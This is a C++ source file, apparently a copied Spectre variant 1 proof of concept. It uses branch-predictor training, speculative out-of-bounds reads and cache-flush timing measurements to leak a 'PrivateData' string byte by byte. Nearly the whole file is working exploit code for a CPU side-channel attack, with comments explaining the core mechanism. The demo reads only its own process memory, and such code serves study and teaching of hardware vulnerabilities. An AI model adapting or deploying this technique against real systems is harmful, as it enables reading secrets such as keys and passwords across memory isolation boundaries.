// DISCLAIMER
// Intellectual Property of code below is NOT mine.
// Please read README.md file.

#include <algorithm>
#include <array>
#include <chrono>
#include <cstring>
#include <iostream>
#include <numeric>
#include <string_view>
#include <x86intrin.h>


constexpr std::string_view process_data[] = {"PublicData", "PrivateData"};

inline void flush_cache(void const *ptr)
{
    // #include <x86intrin.h>
    _mm_clflush(ptr);
}

inline void force_read(int *ptr)
{
    asm volatile("" : : "r"(*ptr) : "memory");
}

char steel_byte(std::string_view data, int out_index)
{
    constexpr int detection_array_size = 256;
    constexpr int cache_line_size_b = 64;

    // setup detection data
    static int detection_array[detection_array_size * cache_line_size_b];
    std::memset(detection_array, 0, sizeof(detection_array));
    std::array<double, detection_array_size> latencies = {};
    std::array<long, detection_array_size> scores = {};

    // valid data in this process
    const char *text = data.begin();
    const int *text_size = new int(data.size()); // long access time (heap)

    for (int run = 0; run < 1000; ++run) {
        for (int i = 0; i < detection_array_size; ++i)
            flush_cache(&detection_array[i * cache_line_size_b]);

        int valid_index = run % *text_size;

        // train BranchPredictor and cache
        for (int t = 0; t < 500; ++t) {
            flush_cache(text_size);
            for (volatile int i = 0; i < 1000; ++i) {}

            // do not know why but this +1 make a difference
            int t_index = ((t + 1) % 10) ? valid_index : out_index;
            // CORE
            // Due to speculative execution code inside the if statement can be executed with condition equal false.
            // No data will be saved, however line can be loaded into cache.
            // Thanks to detection_array cache lines it is possible to encode value as a line in the cache.
            if (t_index < *text_size) {
                int value = text[t_index];
                force_read(&detection_array[value * cache_line_size_b]);
            }
        }

        // measure access time to detection array
        for (int i = 0; i < detection_array_size; ++i) {
            int mixed_i = ((i * 167) + 13) % detection_array_size;
            int *detection_entry = &detection_array[mixed_i * cache_line_size_b];

            const auto start = std::chrono::steady_clock::now();
            force_read(detection_entry);
            const auto end = std::chrono::steady_clock::now();

            std::chrono::duration<double> elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start);
            latencies[mixed_i] = elapsed.count();
        }

        double avg_latency = std::accumulate(latencies.begin(), latencies.end(), 0.0) / detection_array_size;
        for (int i = 0; i < detection_array_size; ++i) {
            if (latencies[i] < (avg_latency * 0.75) && i != text[valid_index])
                ++scores[i];
        }
    }

    auto it = std::max_element(scores.begin(), scores.end());
    int idx = std::distance(scores.begin(), it);
    return idx;
}

int main()
{
    std::cout << "Spectre: ";
    std::cout.flush();
    
    for (int i = process_data[1].begin() - process_data[0].begin();
            i < process_data[1].end() - process_data[0].begin();
            ++i) {
        char c = steel_byte(process_data[0], i);
        std::cout << c;
        std::cout.flush();
    }
    std::cout << "\nDone" << std::endl;
}
